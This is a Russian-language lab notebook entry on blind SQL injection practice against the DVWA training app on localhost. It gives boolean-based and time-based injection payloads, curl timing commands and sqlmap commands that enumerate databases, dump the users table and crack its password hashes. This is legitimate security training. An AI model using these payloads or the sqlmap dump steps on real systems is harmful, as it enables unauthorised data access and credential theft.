# День 14 — Blind SQL Injection
**Дата:** 2026-04-29  
**Платформа:** DVWA (security=low) | Kali Linux

---

## Что такое Blind SQL Injection?

Обычный SQLi — ответ сервера виден прямо на странице.  
Blind SQLi — сервер **ничего не показывает**, но мы всё равно извлекаем данные через:
- **Boolean-based** — анализируем текст ответа (TRUE vs FALSE)
- **Time-based** — измеряем время ответа (задержка vs мгновенно)

---

## Часть 1 — Boolean-based Blind SQLi

### Принцип:
```
TRUE  → страница показывает "User ID exists"
FALSE → страница показывает "User ID MISSING"
```

### Команды:
```sql
-- Базовая проверка
id=1' AND 1=1--+   → TRUE  (User ID exists)
id=1' AND 1=2--+   → FALSE (User ID MISSING)

-- Длина названия БД
id=1' AND LENGTH(database())>3--+   → TRUE
id=1' AND LENGTH(database())>4--+   → FALSE → длина = 4

-- Читаем буквы
id=1' AND SUBSTRING(database(),1,1)='d'--+  → TRUE
id=1' AND SUBSTRING(database(),2,1)='v'--+  → TRUE
id=1' AND SUBSTRING(database(),3,1)='w'--+  → TRUE
id=1' AND SUBSTRING(database(),4,1)='a'--+  → TRUE
```

### Результат: `database() = "dvwa"`

---

## Часть 2 — Time-based Blind SQLi

### Принцип:
```
TRUE  → SLEEP(5) → ответ через ~5 секунд
FALSE → SLEEP(0) → ответ мгновенно (~0.01s)
```

### Команды (запускать через time curl):
```bash
# Базовый SLEEP
time curl -s "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(5)--+&Submit=Submit" \
  -b "security=low; PHPSESSID=ВАШ_SESSID" > /dev/null
# real 5.13s ✅

# IF + SLEEP (длина БД > 3)
id=1' AND IF(LENGTH(database())>3,SLEEP(5),0)--+
# real 5.03s ✅ → TRUE (длина > 3)

# IF + SLEEP (длина БД > 4)
id=1' AND IF(LENGTH(database())>4,SLEEP(5),0)--+
# real 0.07s ✅ → FALSE (длина НЕ > 4, значит = 4)

# Читаем буквы через ASCII
id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=100,SLEEP(5),0)--+
# real 5.07s ✅ → 'd' (ASCII 100)

id=1' AND IF(ASCII(SUBSTRING(database(),2,1))=118,SLEEP(5),0)--+
# real 5.02s ✅ → 'v' (ASCII 118)
```

### Таблица ASCII (нужные символы):
| a=97 | b=98 | c=99 | d=100 | e=101 |
|------|------|------|-------|-------|
| v=118 | w=119 | a=97 | m=109 | n=110 |

---

## Часть 3 — sqlmap автоматизация

### Шаг 1 — найти все БД:
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=ВАШ_SESSID" \
  --dbs --batch --level=2
```
**Результат:**
```
[*] dvwa
[*] information_schema
```

### Шаг 2 — найти таблицы в dvwa:
```bash
sqlmap -u "..." --cookie="..." -D dvwa --tables --batch --level=2
```
**Результат:**
```
+--------------+
| access_log   |
| guestbook    |
| security_log |
| users        |
+--------------+
```

### Шаг 3 — дамп таблицы users:
```bash
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump --batch --level=2
```
**Результат:**
```
admin   → 5f4dcc3b5aa765d61d8327deb882cf99 → password
1337    → 8d3533d75ae2c3966d7e0d4fcc69216b → charley
pablo   → 0d107d09f5bbe40cade3de5c71e9e9b7 → letmein
smithy  → 5f4dcc3b5aa765d61d8327deb882cf99 → password
```
> sqlmap автоматически взломал MD5 хэши через словарь!

---

## Важные заметки

- `PHPSESSID` нужно брать из браузера (F12 → Console → `document.cookie`)
- `security=low` должен быть установлен в браузере до curl-запросов
- sqlmap кэширует результаты в `~/.local/share/sqlmap/output/`
- Флаг `--batch` автоматически отвечает на все вопросы sqlmap

---

## Инструменты дня

| Инструмент | Для чего |
|-----------|---------|
| `time curl` | измерение задержки ответа |
| `SLEEP(5)` | создание задержки в MySQL |
| `IF(cond,SLEEP(5),0)` | условная задержка |
| `ASCII()` | перевод буквы в число |
| `SUBSTRING()` | извлечение символа из строки |
| `sqlmap --dbs` | список всех БД |
| `sqlmap --dump` | дамп таблицы + взлом хэшей |
